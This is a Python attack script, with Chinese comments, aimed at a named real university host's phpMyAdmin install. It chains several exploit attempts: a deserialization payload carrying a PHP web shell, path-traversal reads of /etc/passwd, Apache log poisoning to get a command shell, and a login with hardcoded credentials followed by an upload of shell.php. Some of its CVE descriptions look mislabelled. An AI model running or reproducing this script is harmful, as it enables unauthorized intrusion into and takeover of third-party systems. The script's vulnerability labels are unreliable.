#!/usr/bin/env python3
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"

# phpMyAdmin 4.0.2 已知漏洞
print("[*] 检查phpMyAdmin 4.0.2已知RCE漏洞...")

# CVE-2013-3238: 反序列化漏洞
print("[*] CVE-2013-3238: 反序列化漏洞...")
# 尝试通过setup功能
setup_url = url + "setup/"
setup_resp = requests.get(setup_url, verify=False, timeout=5)
if setup_resp.status_code == 200:
    print("[+] setup目录可访问")
    # 尝试反序列化payload
    malicious_payload = 'O:8:"stdClass":1:{s:4:"test";s:10:"<?php system($_GET[\'c\']); ?>";}'
    setup_data = {
        "Servers/1/host": malicious_payload,
    }
    setup_post = requests.post(setup_url + "index.php", data=setup_data, verify=False, timeout=5)

# CVE-2014-8959: 文件包含漏洞
print("[*] CVE-2014-8959: 文件包含漏洞...")
include_paths = [
    "index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd",
    "import.php?target=../../../../etc/passwd",
    "server_import.php?target=../../../../etc/passwd",
    "db_import.php?target=../../../../etc/passwd",
]

for inc_path in include_paths:
    resp = requests.get(url + inc_path, verify=False, timeout=5)
    if "root:" in resp.text:
        print(f"[+] 文件包含成功: {inc_path}")
        # 尝试包含日志文件
        log_inc = inc_path.replace("/etc/passwd", "/var/log/apache2/access.log")
        # 先访问写入PHP代码
        php_code = "<?php system($_GET['c']); ?>"
        requests.get(url + f"index.php?target={php_code}", verify=False, timeout=5)
        # 包含日志
        shell_resp = requests.get(url + log_inc + "&c=id", verify=False, timeout=5)
        if "uid=" in shell_resp.text:
            print(f"[+] Shell获取成功: {url}{log_inc}&c=id")
            exit(0)

# CVE-2012-5159: SQL注入到RCE
print("[*] CVE-2012-5159: SQL注入...")
# 这个需要特定条件，已经在之前尝试过

# 检查phpMyAdmin的导入功能是否允许上传PHP文件
print("[*] 检查导入功能是否允许PHP文件...")
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

# 尝试上传PHP文件
php_content = "<?php system($_GET['c']); ?>"
files = {"import_file": ("shell.php", php_content, "application/x-php")}
data = {
    "format": "custom",
    "token": token,
    "db": "scmeeting",
}

import_resp = session.post(url + "db_import.php", params={"token": token, "db": "scmeeting"}, files=files, data=data, verify=False, timeout=10)

print(f"[*] 导入响应状态: {import_resp.status_code}")
